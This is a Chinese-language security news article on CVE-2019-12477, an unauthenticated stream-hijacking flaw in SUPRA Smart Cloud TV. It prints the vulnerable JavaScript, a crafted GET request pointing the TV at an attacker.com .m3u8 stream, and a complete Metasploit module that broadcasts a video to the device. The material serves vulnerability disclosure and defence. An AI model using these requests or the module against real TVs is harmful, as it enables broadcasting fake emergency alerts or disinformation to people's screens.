![smart-tv.jpg](https://image.3001.net/images/20190716/1563286846_5d2ddd3e37693.jpg!small)**近期，迪拜安全研究员Dhiraj
Mishra
发现，SUPRA智能云电视存在播放可劫持漏洞（CVE-2019-12477），与SUPRA电视处于同一无线网络环境中的攻击者，可向电视设备伪造播放请求，插播任意视频内容或虚假广播消息。**

据悉，SUPRA智能云电视在俄罗斯和东欧地区非常受欢迎，主要通过网上销售渠道销往俄罗斯、中国和阿联酋等国。Dhiraj
Mishra发现的漏洞问题在于电视流媒体获取功能
'openLiveURL()'，SUPRA电视用它来获取流媒体的播放内容。Mishra发现，该功能缺乏必要的认证授权和会话管理措施，攻击者可以通过向一个静态的URL发送构造请求来触发漏洞，绕过授权验证，向播放机制中注入远程视频流文件，播放任意视频内容。

## 漏洞细节

Dhiraj Mishra透露，他通过源码检查、应用枚举和请求发送方式最终发现了该漏洞。漏洞接口位于
**/remote/media_control?action=setUri &uri=URI**服务端，存在漏洞的功能函数为
**openLiveTV(url)** ，以下为openLiveTV(url)函数源码片段：

    
    
    function openLiveTV(url)
    
      {
    
      $.get("/remote/media_control", {m_action:'setUri',m_uri:url,m_type:'video/*'},
    
       function (data, textStatus){
    
       if("success"==textStatus){
    
        alert(textStatus);
    
       }else
    
       {
    
        alert(textStatus);
    
       }
    
      });
    
      }

向电视设备插入任意视频播放的构造请求：

    
    
    GET /remote/media_control?action=setUri&uri=<http://attacker.com/fake_broadcast_message.m3u8> HTTP/1.1
    
    Host: 192.168.1.155
    
    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:66.0) Gecko/20100101 Firefox/66.0
    
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
    
    Accept-Language: en-US,en;q=0.5
    
    Accept-Encoding: gzip, deflate
    
    Connection: close
    
    Upgrade-Insecure-Requests: 1

当然，也可以直接用以下方式向处于同一无线网络环境中的SUPRA智能电视发起请求，也能实现插播效果：

    
    
    http://192.168.1.155/remote/media_control?action=setUri&uri=http://attacker.com/fake_broadcast_message.m3u8

尽管上述电视播放URL中需要的是.m3u8格式视频，但我们可用`curl -v -X
GET`命令方式来发送类似请求。基于上述分析，恶意攻击者可以无需任何权限限制，向SUPRA智能电视插播任意视频，严重的情况是，攻击者可以利用这种方式来进行虚假信息或反动内容的煽动性宣传，引起社会恐慌。

虽然发现漏洞已有一段时间，但因为我实在联系不到SUPRA智能电视供应商，所以一直到现在，这个漏洞也还是未修复状态。以下POC视频展示的是SUPRA智能电视在播放乔布斯演讲节目时，攻击者利用上述漏洞，突然插播了伪造的美国国家紧急报警系统消息（Emergency
Alert System）：

## Metasploit msf exploit攻击模块

    
    
    ##
    
    # This module requires Metasploit: <https://metasploit.com/download>
    
    # Current source: <https://github.com/rapid7/metasploit-framework>
    
    ##
    
    class MetasploitModule < Msf::Auxiliary
    
      include Msf::Exploit::Remote::HttpClient
    
      include Msf::Exploit::Remote::HttpServer
    
      def initialize(info = {})
    
        super(update_info(info,
    
          'Name'           => 'Supra Smart Cloud TV Remote File Inclusion',
    
          'Description'    => %q{
    
            This module exploits an unauthenticated remote file inclusion which
    
            exists in Supra Smart Cloud TV. The media control for the device doesn't
    
            have any session management or authentication. Leveraging this, an
    
            attacker on the local network can send a crafted request to broadcast a
    
            fake video.
    
          },
    
          'Author'         => [
    
            'Dhiraj Mishra', # Discovery, PoC, and module
    
            'wvu'            # Module
    
          ],
    
          'References'     => [
    
            ['CVE', '2019-12477'],
    
            ['URL', '<https://www.inputzero.io/2019/06/hacking-smart-tv.html>']
    
          ],
    
          'DisclosureDate' => '2019-06-03',
    
          'License'        => MSF_LICENSE
    
        ))
    
        deregister_options('URIPATH')
    
      end
    
      def run
    
        start_service('Path' => '/')
    
        print_status("Broadcasting Epic Sax Guy to #{peer}")
    
        res = send_request_cgi(
    
          'method'        => 'GET',
    
          'uri'           => '/remote/media_control',
    
          'encode_params' => false,
    
          'vars_get'      => {
    
            'action'      => 'setUri',
    
            'uri'         => get_uri + 'epicsax.m3u8'
    
          }
    
        )
    
        unless res && res.code == 200 && res.body.include?('OK')
    
          print_error('No doo-doodoodoodoodoo-doo for you')
    
          return
    
        end
    
        # Sleep time calibrated using successful pcap
    
        print_good('Doo-doodoodoodoodoo-doo')
    
        print_status('Sleeping for 10s serving .m3u8 and .ts files...')
    
        sleep(10)
    
      end
    
      def on_request_uri(cli, request)
    
        dir = File.join(Msf::Config.data_directory, 'exploits', 'CVE-2019-12477')
    
        files = {
    
          '/epicsax.m3u8' => 'application/x-mpegURL',
    
          '/epicsax0.ts'  => 'video/MP2T',
    
          '/epicsax1.ts'  => 'video/MP2T',
    
          '/epicsax2.ts'  => 'video/MP2T',
    
          '/epicsax3.ts'  => 'video/MP2T',
    
          '/epicsax4.ts'  => 'video/MP2T'
    
        }
    
        file = request.uri
    
        unless files.include?(file)
    
          vprint_error("Sending 404 for #{file}")
    
          return send_not_found(cli)
    
        end
    
        data = File.read(File.join(dir, file))
    
        vprint_good("Sending #{file}")
    
        send_response(cli, data, 'Content-Type' => files[file])
    
      end
    
    end 

***参考来源：[inputzero](https://www.inputzero.io/2019/06/hacking-smart-tv.html)，clouds编译，转载请注明来自FreeBuf.COM**  

